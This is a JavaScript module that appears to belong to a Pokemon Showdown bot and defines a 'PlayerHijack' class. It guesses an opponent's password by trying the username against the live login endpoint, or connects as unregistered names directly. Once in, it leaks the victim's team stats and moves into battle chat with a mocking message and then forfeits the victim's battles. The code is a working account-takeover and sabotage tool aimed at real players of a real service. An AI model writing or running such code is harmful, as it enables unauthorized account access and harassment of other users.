let fs         = require('fs');
let settings = require('./settings');
let snooze = ms => new Promise(resolve => setTimeout(resolve, ms));
let Player = require('./Player.js');
let p        = require('util').promisify;
let request  = require('request-promise-native');
let logger	 = require('./logger');

let checkpass = async (user, pass) => {
	let fakechal = '4|034a2f187c98af6da8790273cb5314157d922e1c932aeb6538f5b4c3acdb88809ffdb03f053014e7795a8725d27de1ebdd782ff612484918d0aa43caeab7c66586c83b95f456ccb996b6a94e9aeaa66f18773d401915da8f3899d2715d1dae309ff49c6ff9306ad4ae109be871efd078b69bf19a1b7cccff14976282996668a6';
	let data = {};
	data.challstr = fakechal;
	data.act = 'login';
	data.name = user;
	data.pass = pass;
	let body = await request.post('http://play.pokemonshowdown.com/action.php', {
					 form: data
	});
	if (body[0] != ']')
		return false;
	body = body.substr(1);
	body = JSON.parse(body);
	if (body.assertion[0] == ';') {
		return false;
	}
	return true;
}

let delay = n => {
	return new Promise((res, rej) => {
		setTimeout(() => res(), n)
	});
}

class PlayerHijack {
	constructor(battleData, battlers) {
		let alias = battleData.champ_alias[1] == '1' ? 'p2' : 'p1';
		this.opponent = battlers[alias];
	}

	async tryJack(isRegged) {
		try {
			if (isRegged) {
				let passwords = [this.opponent.showdown_name];
				this.account = false;
				for (let pass of passwords) {
					if (await checkpass(this.opponent.showdown_name, pass)) {
						this.account = new Player(this.opponent.showdown_name, pass);
						break;
					} else {
						console.log(pass + ' did not work');
					}
				}
			} else {
				logger.log(0, 'unregged account ${this.opponent.showdown_name}');
				this.account = new Player(this.opponent.showdown_name);
			}
			if (!this.account)
				return;
			//this.bot = new Player(settings.showdown.user, settings.showdown.pass);
			await this.account.connect();
			logger.log(0, 'connected as ${this.opponent.showdown_name}');
			let battles = this.account.getBattles();
			for (let battle of battles) {
				await this.account.message(battle, 'Hi, my name is J.A.C.K., brought to you by D*gars©');
				let myteam = await this.account.getMyTeam(battle);
				for (let mon of myteam.pokemon) {
					let desc = [mon.details, mon.condition, mon.item, mon.baseAbility,
								Object.keys(mon.stats).map(k => k + ': ' + mon.stats[k]).join(' / '),
								mon.moves.join(', ')].join(' ');
					await this.account.message(battle, desc);
					await delay(1500);
				}
				await this.account.message(battle, 'PERFECTLY HEALTHY');
				await delay(1000);
				await this.account.message(battle, '/forfeit');
				await delay(1000);
			}
			logger.log(0, 'Finished jacking', battles);
			await this.account.disconnect();
		} catch(e) {
			console.log('Could not hijack the opponent:');
			console.log(e);
		}
	}
}

module.exports = PlayerHijack;
